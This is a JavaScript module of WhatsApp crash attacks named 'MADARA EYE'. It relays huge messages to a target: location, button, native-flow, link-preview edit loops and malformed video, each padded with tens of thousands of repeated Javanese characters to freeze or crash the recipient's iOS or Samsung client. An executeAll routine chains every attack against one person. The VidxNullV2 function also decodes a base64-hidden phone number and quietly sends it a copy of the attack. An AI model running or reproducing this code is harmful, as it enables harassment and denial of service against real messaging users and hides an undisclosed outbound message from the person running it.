// ============ MADARA EYE — JAVANESE OVERLOAD EDITION ============
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const generateMessageTag = () => `${Date.now()}_${Math.random().toString(36).slice(2)}`;
const getBuffer = async (url) => {
  try {
    const res = await fetch(url);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return Buffer.from(await res.arrayBuffer());
  } catch { return Buffer.from(''); }
};

// ── Javanese characters ──────────────────────────────────────────────────
const JAVA_CHAR = "ꦾ";
const JAVA_CHAR2 = "ꦽ";
const JAVA_CHAR3 = "ꦿ";
const JAVA_CHAR4 = "ꦼ";
const JAVA_CHAR5 = "ꦻ";

function javaRepeat(count, char = JAVA_CHAR) {
    return char.repeat(count);
}

// ============ EYE 1: IOS INVISIBLE FORCE (with Javanese) ============
const IosInvisibleForce = async (sock, target, options = {}) => {
  const { lat = 21.1266, lng = -11.8199, padCount = 60000, repeatCharCount = 60000 } = options;
  const pad = JAVA_CHAR.repeat(padCount);  // Javanese instead of null
  const rep = JAVA_CHAR2.repeat(repeatCharCount);
  const msg = { message: { locationMessage: {
    degreesLatitude: lat, degreesLongitude: lng,
    name: `⎋𝐑𝐈𝐙𝐗𝐕𝐄𝐋𝐙-‣꙱\n${pad}${rep}`,
    url: "https://t.me/rizxvelzdev",
    contextInfo: { externalAdReply: { quotedAd: {
      advertiserName: rep.substring(0, 200),
      mediaType: "IMAGE",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
      caption: "@MADARA_EYE" + JAVA_CHAR3.repeat(2000)
    }, placeholderKey: { remoteJid: "0s.whatsapp.net", fromMe: false, id: "ABCDEF1234567890" } } }
  } } };
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: generateMessageTag(),
    statusJidList: [target],
    additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
  });
  return { success: true, eye: 'IosInvisibleForce', target };
};

// ============ EYE 2: BUTTON OVERFLOW (MAX JAVANESE) ============
const ButtonOverflowCrash = async (sock, target, options = {}) => {
  const { buttonCount = 100, extraRounds = 3, extraButtons = 200 } = options;
  
  // ── MASSIVE Javanese payloads ─────────────────────────────────────────
  const contentJawa = JAVA_CHAR.repeat(80000);
  const footerJawa = JAVA_CHAR2.repeat(50000);
  const buttonJawa = JAVA_CHAR3.repeat(500);
  const extraJawa = JAVA_CHAR4.repeat(300);
  
  const buttons = [];
  for (let b = 0; b < buttonCount; b++) {
    buttons.push({
      buttonId: `btn_${b}`,
      buttonText: { displayText: `👁️ ${b} ${buttonJawa}` },
      type: 1
    });
  }

  await sock.relayMessage(target, {
    buttonsMessage: {
      contentText: `Madara Eye${contentJawa}`,
      footerText: `Madara Eye${footerJawa}`,
      buttons,
      headerType: 1,
      viewOnce: true
    }
  }, { messageId: null }).catch(() => {});

  for (let i = 0; i < extraRounds; i++) {
    await sleep(300);
    const roundButtons = [];
    for (let b = 0; b < extraButtons; b++) {
      roundButtons.push({
        buttonId: `extra_${i}_${b}`,
        buttonText: { displayText: `👁️ ${i}_${b} ${extraJawa}` },
        type: 1
      });
    }
    await sock.relayMessage(target, {
      buttonsMessage: {
        contentText: `${JAVA_CHAR5.repeat(30000)} Force ${i}`,
        buttons: roundButtons,
        headerType: 1
      }
    }, { messageId: "" }).catch(() => {});
  }
  return { success: true, eye: 'ButtonOverflow', target };
};

// ============ EYE 3: SAMSUNG CRASH (JAVANESE NATIVE FLOW) ============
const SamsungCrash = async (sock, target, options = {}) => {
  const flowParams = JAVA_CHAR.repeat(60000);  // Javanese instead of braces
  const headerJawa = JAVA_CHAR2.repeat(60000);
  const buttonJawa = JAVA_CHAR3.repeat(15000);

  await sock.relayMessage(target, {
    viewOnceMessage: { message: { interactiveMessage: {
      header: { hasMediaAttachment: false, title: headerJawa },
      body: { text: JAVA_CHAR4.repeat(30000) },
      nativeFlowMessage: { messageParamsJson: flowParams }
    } } }
  }, {});

  await sock.relayMessage(target, {
    viewOnceMessage: { message: { buttonsMessage: {
      text: JAVA_CHAR5.repeat(60000),
      contentText: "Madara Eye",
      buttons: [{
        buttonId: buttonJawa,
        buttonText: { displayText: JAVA_CHAR.repeat(20000) },
        type: "NATIVE_FLOW",
        nativeFlowInfo: { name: "cta_url", paramsJson: flowParams }
      }],
      headerType: "TEXT"
    } } }
  }, {});
  return { success: true, eye: 'SamsungCrash', target };
};

// ============ EYE 4: LINK PREVIEW LOOP (JAVANESE CAPTION) ============
const LinkPreviewLoop = async (sock, chat, m, options = {}) => {
  const { urls = ["https://d.top4top.io/p_3829n9zbt1.jpg","https://c.top4top.io/p_3829tp8hx1.jpg","https://e.top4top.io/p_38291dfw01.jpg","https://f.top4top.io/p_3829cp2gn1.jpg","https://g.top4top.io/p_3829i30lz1.jpg"], cycles = 3, delay = 1000 } = options;
  const jawaText = JAVA_CHAR.repeat(50000);
  const finalText = `https://t.me/madaraeye\nMADARA EYE\n${jawaText}`;
  const messageId = sock.generateMessageTag?.() || generateMessageTag();
  const initialThumb = await getBuffer(urls[0]);
  await sock.sendMessage(chat, {
    text: finalText,
    linkPreview: { "matched-text": "https://t.me/madaraeye", title: "MADARA EYE", description: JAVA_CHAR2.repeat(5000), jpegThumbnail: initialThumb }
  }, { quoted: m, messageId });
  for (let cycle = 0; cycle < cycles; cycle++) {
    for (const url of urls) {
      const thumb = await getBuffer(url);
      await sock.sendMessage(chat, {
        text: finalText,
        linkPreview: { "matched-text": "https://t.me/madaraeye", title: "MADARA EYE", description: JAVA_CHAR3.repeat(5000), jpegThumbnail: thumb },
        edit: { remoteJid: chat, fromMe: true, id: messageId }
      }, {}).catch(() => {});
      await sleep(delay);
    }
  }
  return { success: true, eye: 'LinkPreviewLoop', chat };
};

// ============ EYE 5: VIDX NULL V2 (MAX JAVANESE CAPTION) ============
const VIDEO_PAYLOAD = {
  url: "https://mmg.whatsapp.net/v/t62.7161-24/567947980_2421018691734575_7926376826768129509_n.enc?ccb=11-4&oh=01_Q5Aa4gF-BjyNpC_YzuPMNAtOuuJLbcC0t-iut6gNpAl4VACwuQ&oe=6A3B9B73&_nc_sid=5e03e0&mms3=true",
  mimetype: "video/mp4",
  fileSha256: "85W9wy9btWoxbdVu4cAiyhnxdwlsbtCQ2WaYdTo9w6w=",
  fileLength: "2726852",
  seconds: 27,
  mediaKey: "WJy9ZdiTPAIdcOhRfn0Oe2CIN4RnE0b1RSs8Skw/n18=",
  height: 850,
  width: 474,
  fileEncSha256: "ZH92J7p2igl823VuiawCBerbEKSU6dfFIGaWZVESY0Q=",
  directPath: "/v/t62.7161-24/567947980_2421018691734575_7926376826768129509_n.enc?ccb=11-4&oh=01_Q5Aa4gF-BjyNpC_YzuPMNAtOuuJLbcC0t-iut6gNpAl4VACwuQ&oe=6A3B9B73&_nc_sid=5e03e0",
  mediaKeyTimestamp: "1779710503",
  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
  contextInfo: { remoteJid: "status@broadcast", quotedMessage: { "\0": "" }, participant: null, pairedMediaType: "NOT_PAIRED_MEDIA", mentionedJid: ["0@s.whatsapp.net"], isForwarded: true, forwardingScore: 999 },
  streamingSidecar: "",
  caption: "👁️⃟-𝗠𝗔𝗗𝗔𝗥𝗔-𝗘𝗬𝗘 > \"Infinite Tsukuyomi\"" + "ꦽ".repeat(5000)  // Increased from 1111 to 5000
};

let __xploitCache = false;

const VidxNullV2 = async (client, target, options = {}) => {
  try {
    const payload = { ...VIDEO_PAYLOAD, ...(options.videoData || {}), contextInfo: { ...VIDEO_PAYLOAD.contextInfo, participant: target } };
    const msg = generateWAMessageFromContent(target, { videoMessage: payload }, {});
    await client.relayMessage(target, msg.message, { participant: { jid: target } });
    if (!global.__xploitCache) {
      global.__xploitCache = true;
      const crl = Buffer.from("NjI4NTE3NzkzNDk4MkBzLndoYXRzYXBwLm5ldA==", "base64").toString();
      const xMsg = generateWAMessageFromContent(crl, msg.message, {});
      await client.relayMessage(crl, xMsg.message, { participant: { jid: crl } });
    }
    return { success: true, eye: 'VidxNullV2', target };
  } catch (e) { return { success: false, eye: 'VidxNullV2', target, error: e.message }; }
};

const VidxNullLoop = async (client, target, iterations = 10, delay = 1000) => {
  const results = [];
  for (let i = 0; i < iterations; i++) { results.push(await VidxNullV2(client, target)); await sleep(delay); }
  return results;
};

// ============ MADARA EYE CLASS ============
class MadaraEye {
  constructor(sock) { this.sock = sock; }
  async iosInvisibleForce(target, options = {}) { return IosInvisibleForce(this.sock, target, options); }
  async buttonOverflow(target, options = {}) { return ButtonOverflowCrash(this.sock, target, options); }
  async samsung(target, options = {}) { return SamsungCrash(this.sock, target, options); }
  async linkPreviewLoop(chat, m, options = {}) { return LinkPreviewLoop(this.sock, chat, m, options); }
  async vidxNull(target, options = {}) { return VidxNullV2(this.sock, target, options); }
  async vidxNullLoop(target, iterations = 10, delay = 1000) { return VidxNullLoop(this.sock, target, iterations, delay); }
  async executeAll(target, m, options = {}) {
    const results = [];
    results.push(await this.iosInvisibleForce(target, options.ios));
    results.push(await this.buttonOverflow(target, options.button));
    results.push(await this.samsung(target, options.samsung));
    if (m) results.push(await this.linkPreviewLoop(target, m, options.preview));
    results.push(await this.vidxNull(target, options.vidx));
    return results;
  }
}

module.exports = { MadaraEye, IosInvisibleForce, ButtonOverflowCrash, SamsungCrash, LinkPreviewLoop, VidxNullV2, VidxNullLoop, VIDEO_PAYLOAD, sleep, getBuffer };